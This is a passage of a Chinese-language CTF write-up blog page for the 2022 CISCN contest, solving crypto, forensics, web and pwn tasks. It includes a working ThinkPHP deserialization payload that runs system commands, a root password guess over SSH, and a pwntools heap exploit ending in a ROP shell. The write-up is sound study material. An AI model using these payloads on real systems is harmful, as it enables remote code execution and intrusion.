@@ -1,0 +1,494 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>CISCN Crypt0 战队 WRITEUP | Console.makeHappy(_1ming)</title>
+<meta name=keywords content="CTF,WriteUP,Web,Note">
+<meta name=description content="一、战队信息 战队名称： crypt0 战队排名：43 二、解题情况 三、解题过程 1. 签到电台 操作内容 根据信息查询电码得： 1732 2514 1344 0356 0451 6671 0055 所给密码本前7*4位： 2596 1288">
+<meta name=author content="Yiming Shen">
+<link rel=canonical href=https://shinning.cloud/post/ctf/wp/ciscnwp/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link href=/assets/css/stylesheet.min.96ff96383199830fa3579b27d0827aa2d1dc17d7ac4182b5dca790d464d24229.css integrity="sha256-lv+WODGZgw+jV5sn0IJ6otHcF9esQYK13KeQ1GTSQik=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://shinning.cloud/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://shinning.cloud/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://shinning.cloud/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://shinning.cloud/apple-touch-icon.png>
+<link rel=mask-icon href=https://shinning.cloud/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.91.0">
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<meta property="og:title" content="CISCN Crypt0 战队 WRITEUP">
+<meta property="og:description" content="一、战队信息 战队名称： crypt0 战队排名：43 二、解题情况 三、解题过程 1. 签到电台 操作内容 根据信息查询电码得： 1732 2514 1344 0356 0451 6671 0055 所给密码本前7*4位： 2596 1288">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://shinning.cloud/post/ctf/wp/ciscnwp/">
+<meta property="og:image" content="https://shinning.cloud/CNSS%20Recruit-Web%20Write%20UP%20%28copy%29.assets/%7D/crypt0-3.png"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2022-05-29T00:00:00+00:00">
+<meta property="article:modified_time" content="2022-05-29T00:00:00+00:00"><meta property="og:site_name" content="Yiming">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://shinning.cloud/CNSS%20Recruit-Web%20Write%20UP%20%28copy%29.assets/%7D/crypt0-3.png">
+<meta name=twitter:title content="CISCN Crypt0 战队 WRITEUP">
+<meta name=twitter:description content="一、战队信息 战队名称： crypt0 战队排名：43 二、解题情况 三、解题过程 1. 签到电台 操作内容 根据信息查询电码得： 1732 2514 1344 0356 0451 6671 0055 所给密码本前7*4位： 2596 1288">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shinning.cloud/post/"},{"@type":"ListItem","position":3,"name":"🏁CTF","item":"https://shinning.cloud/post/ctf/"},{"@type":"ListItem","position":4,"name":"WriteUP","item":"https://shinning.cloud/post/ctf/wp/"},{"@type":"ListItem","position":5,"name":"CISCN Crypt0 战队 WRITEUP","item":"https://shinning.cloud/post/ctf/wp/ciscnwp/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CISCN Crypt0 战队 WRITEUP","name":"CISCN Crypt0 战队 WRITEUP","description":"一、战队信息 战队名称： crypt0 战队排名：43 二、解题情况 三、解题过程 1. 签到电台 操作内容 根据信息查询电码得： 1732 2514 1344 0356 0451 6671 0055 所给密码本前7*4位： 2596 1288","keywords":["CTF","WriteUP","Web","Note"],"articleBody":"一、战队信息 战队名称： crypt0\n战队排名：43\n二、解题情况 三、解题过程 1. 签到电台 操作内容 根据信息查询电码得：\n1732 2514 1344 0356 0451 6671 0055\n所给密码本前7*4位：\n2596 1288 9021 9881 7176 6305 6302\n模十算法计算结果：\n3228 3792 0365 9137 7527 2976 6357\n上传数据：\nflag值： flag{86e9206c-fb8a-487a-8c5e-0b60c5b40c93}\r2. Ezpop 操作内容   进入网址，进行信息收集，发现robots.txt，无内容\n  dirsearch目录扫描\ndirsearch -u http://eci-2ze2gn5mwurc7epmkty8.cloudeci1.ichunqiu.com/\n发现敏感文件：www.zip\n  下载得到网站泄露的源代码\n  从/vendor/autoload.php www\\app\\controller\\index.php中发现入口是post数据a，根据题名可知是pop链的thinkphp框架反序列化，逐链寻找，得到入口\n  构造反序列化对象\n  O:17:\"think\\model\\Pivot\":9:{s:19:\"think\\Modelexists\";b:1;s:18:\"think\\Modelforce\";b:1;s:21:\"think\\ModellazySave\";b:1;s:9:\"*suffix\";O:17:\"think\\model\\Pivot\":9:{s:19:\"think\\Modelexists\";b:1;s:18:\"think\\Modelforce\";b:1;s:21:\"think\\ModellazySave\";b:1;s:9:\"*suffix\";s:0:\"\";s:17:\"think\\Modeldata\";a:1:{s:4:\"test\";a:1:{s:4:\"test\";s:13:\"cat+/flag.txt\";}}s:21:\"think\\ModelwithAttr\";a:1:{s:4:\"test\";a:1:{s:4:\"test\";s:6:\"system\";}}s:7:\"*json\";a:1:{i:0;s:4:\"test\";}s:12:\"*jsonAssoc\";b:1;s:12:\"*withEvent\";b:0;}s:17:\"think\\Modeldata\";a:1:{s:4:\"test\";a:1:{s:4:\"test\";s:13:\"cat+/flag*\";}}s:21:\"think\\ModelwithAttr\";a:1:{s:4:\"test\";a:1:{s:4:\"test\";s:6:\"system\";}}s:7:\"*json\";a:1:{i:0;s:4:\"test\";}s:12:\"*jsonAssoc\";b:1;s:12:\"*withEvent\";b:0;} URL编码后post方法传入对象  POST http://eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com/index.php/index/test HTTP/1.1\rHost: eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\rCookie: ci_session=9bae6a3aa78f5d0b1d119d3803fc01d59d5ddba3; __jsluid_h=cb19eaa96eca8cfd4082513fec391da7\rConnection: close\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 1377\ra=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D\rflag值： flag{656d09d3-60d4-4410-ba78-a743f97df418}\r3. 基于挑战码的双向认证I和II 操作内容(非预期解) 进入root用户目录，查看start.sh文件内容，发现flag目录，直接cat获得两题的flag。\nflag值： flag{6cc71f34-faal-4827-8480-22dc3659d90c}\rflag{34f5fdaf-c373-47fd-afab-01ed2914c1la}\r4. 基于挑战码的双向认证III 操作内容（非预期解） 连入ssh后，尝试爆破root用户常见弱口令\n尝试toor后，成功，获取root权限\n拿到flag\nflag值： flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}\r5. ez_usb 操作内容  获取附件 获取USB流量包  将不同Source，Destination为host的流量包分开\nhcacker.py\" / 用下面提供的脚本对键盘按键进行分析\n获取内容如下：\n![计算机生成了可选文字: #tong@kali-hypervin•u/miscl[18：49：41] ，pythonUsbKeyboard4acker.py2a8a1．pcapng 刁UnknowKey： 刁UnknowKey。 刁UnknowKey：91 [刁UnknowKey：91 [+]Found 526172211a97e9〈CPc〈CP+987彐e9999 d99999999999999C4527424g4彐588彐e99999a2〈CPa999999〈 CP82b9f9bø5彐9778b5541d彐彐989a2e999999666C61672〈CP e〈CP747874〈CPbgb〈CP*I彐242f彐a〈CPfc〈CPe99 bß92c22gd6egg4167cø5〈CPa7〈CP8798b271f〈CPfc〈C P842ae彐d251e655彐6〈CPfga〈CPda87C774e6b67d9〈CP e6彐16684766〈CPa86e844d〈CP81aa2〈CPC72C71彐48d1 ec4c3d7bøuøø7øø #tong@kali-hypervinN/miscl[18：：2彐] ，pythonUsbKeyboarcNacker.py2a1øa1.pcapng [+]Found：彐5C5彐5765e5ea74a #tong@kali-hypervinN/miscl[18：．49]\n其中分别为RAR文件与其解压密码\n解压后文件可得\nFlag：\nflag{20de17cc-d2c1-4b61-bebd-41159ed7172d}\r脚本代码 #!/usr/bin/env python import sys import os DataFileName = \"usb.dat\" presses = [] normalKeys = {\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"\",\"29\":\"\",\"2a\":\"\", \"2b\":\"\\t\",\"2c\":\"\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"\",\"33\":\";\",\"34\":\"'\",\"35\":\"\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"\",\"3a\":\"\",\"3b\":\"\", \"3c\":\"\",\"3d\":\"\",\"3e\":\"\",\"3f\":\"\",\"40\":\"\",\"41\":\"\",\"42\":\"\",\"43\":\"\",\"44\":\"\",\"45\":\"\"} shiftKeys = {\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"\u0026\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"\",\"29\":\"\",\"2a\":\"\", \"2b\":\"\\t\",\"2c\":\"\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"\",\"36\":\",\"37\":\"\",\"38\":\"?\",\"39\":\"\",\"3a\":\"\",\"3b\":\"\", \"3c\":\"\",\"3d\":\"\",\"3e\":\"\",\"3f\":\"\",\"40\":\"\",\"41\":\"\",\"42\":\"\",\"43\":\"\",\"44\":\"\",\"45\":\"\"} def main(): # check argv if len(sys.argv) != 2: print(\"Usage : \") print(\" python UsbKeyboardHacker.py data.pcap\") print(\"Tips : \") print(\" To use this python script , you must install the tshark first.\") print(\" You can use `sudo apt-get install tshark` to install it\") print(\"Author : \") print(\" WangYihang \") print(\" If you have any questions , please contact me by email.\") print(\" Thank you for using.\") exit(1) # get argv pcapFilePath = sys.argv[1] # get data of pcap os.system(\"tshark -r %s-T fields -e usb.capdata 'usb.data_len == 8'  %s\" % (pcapFilePath, DataFileName)) # read data with open(DataFileName, \"r\") as f: for line in f: presses.append(line[0:-1]) # handle result = \"\" for press in presses: if press == '': continue if ':' in press: Bytes = press.split(\":\") else: Bytes = [press[i:i+2] for i in range(0, len(press), 2)] if Bytes[0] == \"00\": if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]): result += normalKeys[Bytes[2]] elif int(Bytes[0],16) \u0026 0b10 or int(Bytes[0],16) \u0026 0b100000: # shift key is pressed. if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]): result += shiftKeys[Bytes[2]] else: print(\"[-] Unknow Key : %s\" % (Bytes[0])) print(\"[+] Found : %s\" % (result)) # clean the temp data os.system(\"rm ./%s\" % (DataFileName)) if __name__ == \"__main__\": main() 6. baby_tree 操作内容 分析给出的ast树，推出加密算法\ndef encodeing(e, Val): b = list(e) k = list(Val) for i in range(39): r0,r1,r2,r3 = b[i],b[i+1],b[i+2],b[i+3] b[i+0]= r2^((k[0] +(r0 4)) \u0026 0xff) b[i+1] = r3((k[1] +(r1 2)) \u0026 0xff) b[i+2]= r0^ k[2] b[i+3] = r1^ k[3] k[0],k[1],k[2],k[3]= k[1],k[2],k[3],k[0] return b 根据该算法，推出以下解密代码，计算b值，得到flag\n*脚本代码 k = list(b'y345') Bytes= [88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16] for i in range(38, -1, -1): k[0], k[1], k[2], k[3] = k[3], k[0], k[1], k[2] r1 = Bytes[i+3] ^ k[3] r0 = Bytes[i+2] ^ k[2] r3 = Bytes[i+1] ^ ((k[1] + (r1  2)) \u0026 0xff) r2 = Bytes[i] ^ ((k[0] + (r0  4)) \u0026 0xff) Bytes[i], Bytes[i+1], Bytes[i+2], Bytes[i+3] = r0, r1, r2, r3 print(bytes(Bytes)) flag值： flag{30831242-56db-45b4-96fd-1f47e60da99d}\r7. everlasting_night 操作内容   下载附件\n  获取png图片\n  使用HxD Hex Editor发现png文件尾异常\n  正好多出32位数据\nFB 3E FC E4 CE AC 2F 54 45 C7 AE 17 E3 E9 69 AB\r猜测是md5值，进行撞库\n字符串：ohhWh04m1\n加上后补充的提示使用LSB隐写\n使用https://github.com/livz/cloacked-pixel中脚本与上文密码进行解密\n解密得到的压缩包，密码就是上面的字符串，获得flag的变形图片，打开photoshop对其进行变形位移调整\nflag值： flag{607f41da-e849-4c0b-8867-1b3c74536cc4}\r8. newest_note nc连接后，根据附件，编写相应脚本，执行后可得flag\n脚本代码 from pwn import * p = process(\"./pwn\") libc = ELF('./libc.so.6') def add(i, data=\"aaaaaaaa\"): p.recvuntil(': ') p.sendline(\"1\") p.recvuntil(': ') p.sendline(str(i)) p.recvuntil(': ') p.send(data) def dele(i): p.recvuntil(': ') p.sendline(\"2\") p.recvuntil(': ') p.sendline(str(i)) def show(i): p.recvuntil(': ') p.sendline(\"3\") p.recvuntil(': ') p.sendline(str(i)) p.recvuntil(\"Content: \") m = p.recvline() return u64(m[:-1].ljust(8,b'\\x00')) if __name__ == '__main__': # 先泄露堆地址 booksize = 0x1fffffff + 0xa0 p.recvuntil(\"will be? :\") p.sendline(str(booksize)) # malloc 0x500 add(0) add(1) add(2) add(3) dele(0) m = show(0) heap_base = m  12 print(\"heap==\", hex(heap_base)) # 构造tcache bin链 dele(1) dele(2) dele(3) # 修改标志位，就可以继续删除 add(0xa9) dele(1) # 分配到最上面 add(4, p64((heap_base  12) ^ (heap_base + 0x2a0))) add(5) add(6) add(7) dele(7) # 泄露libc地址 libc_base = show(7) - 0x218cc0 print('libc_base==', hex(libc_base)) # 泄露堆栈地址 env = libc.sym['environ'] add(20, p64(libc_base+env)*0x4) stack_addr = show(0x0) print('stack==', hex(stack_addr)) payload = p64(heap_base+0x300)+p64(0x41)+p64(0x1000)+p64(0x41)+p64(0)*2 add(0, payload) payload = p64(0) + p64(0x41) + p64(0x1000) + p64(0x41) + p64(0) + p64(0) add(1, payload) add(2) add(3) dele(3) dele(1) dele(8) # rop payload = b'a' * 0x20+p64((heap_base  12) ^ (stack_addr - 0x1a8+0x50)) add(0, payload) add(0) binsh = libc.search(b'/bin/sh').__next__() sys = libc.sym['system'] payload = p64(0) + p64(libc_base+0x02e6c5)+p64(libc_base + binsh) payload += p64(libc_base + 0x02d9b9) + p64(libc_base + sys) add(0,payload) p.interactive() flag值： flag{6c9d1e47-1611-4b5f-9890-5f988b0c3fcc}\r","wordCount":"2255","inLanguage":"en","image":"https://shinning.cloud/CNSS%20Recruit-Web%20Write%20UP%20%28copy%29.assets/%7D/crypt0-3.png","datePublished":"2022-05-29T00:00:00Z","dateModified":"2022-05-29T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shinning.cloud/post/ctf/wp/ciscnwp/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shinning.cloud/favicon.ico"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<noscript>
+<style type=text/css>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://shinning.cloud accesskey=h title="相位  (Alt + H)">
+<img src=/favicon.ico alt=logo aria-label=logo height=35>相位 </a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu onscroll=menu_on_scroll()>
+<li>
+<a href=https://shinning.cloud/post/ title=文章>
+<span>文章</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/archive/ title=归档>
+<span>归档</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/categories/ title=分类>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/tags/ title=标签>
+<span>标签</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/search/ title="搜索 (Alt + /)" accesskey=/>
+<span>搜索</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/friends/ title=友链>
+<span>友链</span>
+</a>
+</li>
+<li>
+<a href=https://shinning.cloud/about/ title=关于>
+<span>关于</span>
+</a>
+</li></ul>
+</nav>
+</header>
+<main class=main>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs>
+<a href=https://shinning.cloud>首页</a>&nbsp;»&nbsp;<a href=https://shinning.cloud/post/>文章</a>&nbsp;»&nbsp;<a href=https://shinning.cloud/post/ctf/>🏁CTF</a>&nbsp;»&nbsp;<a href=https://shinning.cloud/post/ctf/wp/>WriteUP</a>
+</div>
+<h1 class=post-title>
+CISCN Crypt0 战队 WRITEUP
+</h1>
+<div class=post-meta>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+May 29, 2022&nbsp;·&nbsp;May 29, 2022&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Yiming Shen
+|&nbsp;<a href=https://github.com/shenyimings/shenyimings.github.io/tree/main/docs rel="noopener noreferrer" target=_blank>Issue</a>
+</div>
+</header>
+<div class=entry-img1>
+<figure class=entry-cover><img src=https://shinning.cloud/CNSS%20Recruit-Web%20Write%20UP%20%28copy%29.assets/%7D/crypt0-3.png alt>
+</figure>
+</div>
+<div class=post-content>
+<h2 id=一战队信息>一、战队信息<a hidden class=anchor aria-hidden=true href=#一战队信息>#</a></h2>
+<p><strong>战队名称：</strong> crypt0</p>
+<p><strong>战队排名</strong>：43</p>
+<h2 id=二解题情况>二、解题情况<a hidden class=anchor aria-hidden=true href=#二解题情况>#</a></h2>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529200947359.png alt=image-20220529200947359>
+</p>
+<h2 id=三解题过程>三、解题过程<a hidden class=anchor aria-hidden=true href=#三解题过程>#</a></h2>
+<h3 id=1-签到电台>1. 签到电台<a hidden class=anchor aria-hidden=true href=#1-签到电台>#</a></h3>
+<h4 id=操作内容>操作内容<a hidden class=anchor aria-hidden=true href=#操作内容>#</a></h4>
+<p>根据信息查询电码得：</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529131719396.png alt=image-20220529131719396>
+</p>
+<p>1732 2514 1344 0356 0451 6671 0055</p>
+<p>所给密码本前7*4位：</p>
+<p>2596 1288 9021 9881 7176 6305 6302</p>
+<p>模十算法计算结果：</p>
+<p>3228 3792 0365 9137 7527 2976 6357</p>
+<p>上传数据：</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529131525914.png alt=image-20220529131525914>
+</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529112929847.png alt=image-20220529112929847>
+</p>
+<h4 id=flag值>flag值：<a hidden class=anchor aria-hidden=true href=#flag值>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{86e9206c-fb8a-487a-8c5e-0b60c5b40c93}
+</code></pre><h3 id=2-ezpop>2. Ezpop<a hidden class=anchor aria-hidden=true href=#2-ezpop>#</a></h3>
+<h4 id=操作内容-1>操作内容<a hidden class=anchor aria-hidden=true href=#操作内容-1>#</a></h4>
+<ol>
+<li>
+<p>进入网址，进行信息收集，发现<code>robots.txt</code>，无内容</p>
+</li>
+<li>
+<p>dirsearch目录扫描</p>
+<p><code>dirsearch -u http://eci-2ze2gn5mwurc7epmkty8.cloudeci1.ichunqiu.com/</code></p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529191648946.png alt=image-20220529191648946>
+</p>
+<p><strong>发现敏感文件：<code>www.zip</code></strong></p>
+</li>
+<li>
+<p>下载得到网站泄露的源代码</p>
+</li>
+<li>
+<p>从<code>/vendor/autoload.php</code> <code>www\app\controller\index.php</code>中发现入口是post数据a，根据题名可知是pop链的thinkphp框架反序列化，逐链寻找，得到入口</p>
+</li>
+<li>
+<p>构造反序列化对象</p>
+</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#960050;background-color:#1e0010>O:</span><span style=color:#ae81ff>17</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;think\model\Pivot&#34;</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span>{<span style=color:#960050;background-color:#1e0010>s:19:</span><span style=color:#f92672>&#34;think\Modelexists&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>18</span>:<span style=color:#e6db74>&#34;think\Modelforce&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>21</span>:<span style=color:#e6db74>&#34;think\ModellazySave&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>9</span>:<span style=color:#e6db74>&#34;*suffix&#34;</span><span style=color:#960050;background-color:#1e0010>;O</span>:<span style=color:#ae81ff>17</span>:<span style=color:#e6db74>&#34;think\model\Pivot&#34;</span>:<span style=color:#ae81ff>9</span>:{<span style=color:#960050;background-color:#1e0010>s:19:</span><span style=color:#f92672>&#34;think\Modelexists&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>18</span>:<span style=color:#e6db74>&#34;think\Modelforce&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>21</span>:<span style=color:#e6db74>&#34;think\ModellazySave&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>9</span>:<span style=color:#e6db74>&#34;*suffix&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>0</span>:<span style=color:#e6db74>&#34;&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>17</span>:<span style=color:#e6db74>&#34;think\Modeldata&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span 